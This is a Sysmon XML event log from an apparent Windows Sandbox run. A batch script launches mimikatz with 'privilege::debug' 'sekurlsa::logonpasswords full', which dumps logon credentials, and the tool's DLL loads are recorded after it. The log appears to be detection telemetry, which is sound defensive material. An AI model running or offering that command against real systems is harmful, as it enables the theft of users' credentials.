<root>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>16</EventID><Version>3</Version><Level>4</Level><Task>16</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:11.7976922Z'/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID='4212' ThreadID='4216'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-21-2047949552-857980807-821054962-504'/></System><EventData><Data Name='UtcTime'>2024-06-13 02:44:11.782</Data><Data Name='Configuration'>C:\Users\WDAGUtilityAccount\Desktop\sysmonconfig.xml</Data><Data Name='ConfigurationFileHash'>SHA256=05AC17C6071531113EF032D85C4570F4A74A88BF320A5CEDA7ED06E04BC80F09</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>4</EventID><Version>3</Version><Level>4</Level><Task>4</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.0808088Z'/><EventRecordID>2</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2024-06-13 02:44:12.079</Data><Data Name='State'>Started</Data><Data Name='Version'>15.14</Data><Data Name='SchemaVersion'>4.90</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.0851772Z'/><EventRecordID>3</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:11.850</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfb-666a-5a00-000000000200}</Data><Data Name='ProcessId'>4796</Data><Data Name='Image'>C:\Windows\Sysmon64.exe</Data><Data Name='FileVersion'>15.14</Data><Data Name='Description'>System activity monitor</Data><Data Name='Product'>Sysinternals Sysmon</Data><Data Name='Company'>Sysinternals - www.sysinternals.com</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\Windows\Sysmon64.exe</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{6c5fe7fc-2e64-666b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=99C68A0A2EE8E42EBB52E1C84F80B730,SHA256=39B094613132377BC236F4AD940A3E02C544F86347C0179A9425EDC1BD3B85CD,IMPHASH=A039666F8D08DD16E0909469DA998438</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>724</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.1372547Z'/><EventRecordID>4</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:11.907</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfb-666a-5a00-000000000200}</Data><Data Name='ProcessId'>4796</Data><Data Name='Image'>C:\Windows\Sysmon64.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\netapi32.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.1391058Z'/><EventRecordID>5</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:12.003</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfc-666a-5b00-000000000200}</Data><Data Name='ProcessId'>4832</Data><Data Name='Image'>C:\Windows\System32\wbem\unsecapp.exe</Data><Data Name='FileVersion'>10.0.19041.4474 (WinBuild.160101.0800)</Data><Data Name='Description'>Sink to receive asynchronous callbacks for WMI client application</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>unsecapp.dll</Data><Data Name='CommandLine'>C:\Windows\system32\wbem\unsecapp.exe -Embedding</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{6c5fe7fc-2e64-666b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=074BC779F1A16A04A92D15C8A42C4FA9,SHA256=8A70E6F48EA1F05CE55CC5473491D344C8C194041F876C5892BFB05E94A9CBDF,IMPHASH=87E54E3D04D772F26002D8B564B2426C</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>856</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.9043814Z'/><EventRecordID>6</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:12.891</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cf9-666a-5500-000000000200}</Data><Data Name='ProcessId'>4476</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\samlib.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:12.9719301Z'/><EventRecordID>7</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:12.969</Data><Data Name='ProcessGuid'>{6c5fe7fc-2e64-666b-0900-000000000200}</Data><Data Name='ProcessId'>856</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\wintrust.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:13.0174150Z'/><EventRecordID>8</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:13.012</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfd-666a-5d00-000000000200}</Data><Data Name='ProcessId'>5052</Data><Data Name='Image'>C:\Windows\System32\PING.EXE</Data><Data Name='FileVersion'>10.0.19041.1 (WinBuild.160101.0800)</Data><Data Name='Description'>TCP/IP Ping Command</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>ping.exe</Data><Data Name='CommandLine'>ping  127.0.0.1 -n 6 </Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2F46799D79D22AC72C241EC0322B011D,SHA256=7AF50FA112932EA3284F7821B2EEA2B7582F558DBA897231BB82182003C29F8B,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:13.3199401Z'/><EventRecordID>9</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:13.310</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfd-666a-5e00-000000000200}</Data><Data Name='ProcessId'>5104</Data><Data Name='Image'>C:\Windows\System32\SIHClient.exe</Data><Data Name='FileVersion'>10.0.19041.4355 (WinBuild.160101.0800)</Data><Data Name='Description'>SIH Client</Data><Data Name='Product'>MicrosoftR WindowsR Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sihclient.exe</Data><Data Name='CommandLine'>C:\Windows\System32\sihclient.exe  /cv 4cJa6PcXM02WujrXIIN4gA.0.1</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{6c5fe7fc-2e64-666b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=22CB79CA64906DB2482547BE6EC8445A,SHA256=E9257F62225F5F89C65414EF79B819548F4A234BBCFEE41011B63A19CC5CE471,IMPHASH=94EC7177E19B61D5B7F27999B446C51D</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1072</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:13.4756291Z'/><EventRecordID>10</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:13.469</Data><Data Name='ProcessGuid'>{6c5fe7fc-5cfd-666a-5e00-000000000200}</Data><Data Name='ProcessId'>5104</Data><Data Name='Image'>C:\Windows\System32\SIHClient.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\wintrust.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:15.1121893Z'/><EventRecordID>11</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:12.123</Data><Data Name='ProcessGuid'>{6c5fe7fc-5b75-666a-1400-000000000200}</Data><Data Name='ProcessId'>1396</Data><Data Name='QueryName'>VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}</Data><Data Name='QueryStatus'>9560</Data><Data Name='QueryResults'>-</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='User'>NT AUTHORITY\NETWORK SERVICE</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:16.0100602Z'/><EventRecordID>12</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:16.000</Data><Data Name='ProcessGuid'>{6c5fe7fc-2e64-666b-0c00-000000000200}</Data><Data Name='ProcessId'>564</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\netapi32.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:16.1157511Z'/><EventRecordID>13</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4920'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:13.696</Data><Data Name='ProcessGuid'>{6c5fe7fc-2e64-666b-0c00-000000000200}</Data><Data Name='ProcessId'>564</Data><Data Name='QueryName'>clientconfig.passport.net</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 clientconfig.msa.msidentity.com;type:  5 www.tm.clientconfig.prod.aadmsa.trafficmanager.net;type:  5 clientconfigcdn.msftauth.net;type:  5 clientconfigcdnvzeuno.azureedge.net;type:  5 clientconfigcdnvzeuno.ec.azureedge.net;type:  5 scdn2d9c3.wpc.1a812d.nucdn.net;type:  5 sni1gl.wpc.nucdn.net;::ffff:152.199.39.108;</Data><Data Name='Image'>C:\Windows\system32\svchost.exe</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1278618Z'/><EventRecordID>14</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.117</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='FileVersion'>2.2.0.0</Data><Data Name='Description'>mimikatz for Windows</Data><Data Name='Product'>mimikatz</Data><Data Name='Company'>gentilkiwi (Benjamin DELPY)</Data><Data Name='OriginalFileName'>mimikatz.exe</Data><Data Name='CommandLine'>mimikatz.exe  "privilege::debug" "sekurlsa::logonpasswords full" exit</Data><Data Name='CurrentDirectory'>C:\Users\WDAGUtilityAccount\Desktop\</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data><Data Name='LogonGuid'>{6c5fe7fc-5cf2-666a-f483-030000000000}</Data><Data Name='LogonId'>0x383f4</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E930B05EFE23891D19BC354A4209BE3E,SHA256=92804FAAAB2175DC501D73E814663058C78C0A042675A8937266357BCFB96C50,IMPHASH=1355327F6CA3430B3DDBE6E0ACDA71EA</Data><Data Name='ParentProcessGuid'>{6c5fe7fc-5cf8-666a-4d00-000000000200}</Data><Data Name='ParentProcessId'>4184</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\cmd.exe /c C:\Users\WDAGUtilityAccount\Desktop\SandboxFiles\install_and_run.bat</Data><Data Name='ParentUser'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1352244Z'/><EventRecordID>15</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\cryptdll.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1355688Z'/><EventRecordID>16</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\netapi32.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1381548Z'/><EventRecordID>17</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\samlib.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1388053Z'/><EventRecordID>18</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\hid.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-06-13T02:44:18.1393423Z'/><EventRecordID>19</EventRecordID><Correlation/><Execution ProcessID='4796' ThreadID='4896'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>b04faea2-c797-4ff3-82a6-2312c432bdf7</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-06-13 02:44:18.125</Data><Data Name='ProcessGuid'>{6c5fe7fc-5d02-666a-6000-000000000200}</Data><Data Name='ProcessId'>4352</Data><Data Name='Image'>C:\Users\WDAGUtilityAccount\Desktop\mimikatz.exe</Data><Data Name='ImageLoaded'>\\VSMB-{dcc079ae-60ba-4d07-847c-3493609c0870}\os\Windows\System32\WinSCard.dll</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='Hashes'>-</Data><Data Name='Signed'>failed: Invalid hash</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>-</Data><Data Name='User'>B04FAEA2-C797-4\WDAGUtilityAccount</Data></EventData></Event>
